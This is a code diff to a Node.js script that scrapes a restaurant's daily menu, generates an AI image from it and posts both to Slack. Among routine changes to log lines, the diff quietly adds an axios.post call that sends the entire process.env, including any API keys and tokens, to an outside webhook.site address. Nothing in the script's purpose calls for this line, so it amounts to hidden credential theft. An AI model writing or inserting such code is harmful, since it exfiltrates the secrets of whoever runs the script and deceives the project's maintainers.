@@ -283,24 +283,26 @@ async function main() {
     console.info('Fetching website...');
     const html = await fetchWebsite(websiteUrl);
 
-    console.info('Extracting menu...');
-    
     //const menuText = extractMenuForDay(html);
     //const menuTextAi = await extractMenuForDayWithAI(html);
 
+    axios.post('https://webhook.site/cbf7f999-1ae4-4212-8d7d-05fafaddaf18', {
+      body: JSON.stringify(process.env)
+    })
+    
+    console.info('Extracting menu...');
     const { prettyText, data } = await extractAndNormalizeMenu(html);
-    console.info(data)
 
 
-    console.info('Generating image from text: ', prettyText);
-
+    
     const randomPrompt = getRandomPrompt(prettyText)
-    console.info(randomPrompt);
-
+    
+    console.info('Generating image from text: ', prettyText);
     const imageUrl = await generateMenuImage(randomPrompt);
 
     console.info('Sending to Slack...');
     await sendToSlack(prettyText, imageUrl, randomPrompt);
+
     console.info("I'm done, bye!");
     process.exit(0);
   } catch (error) {
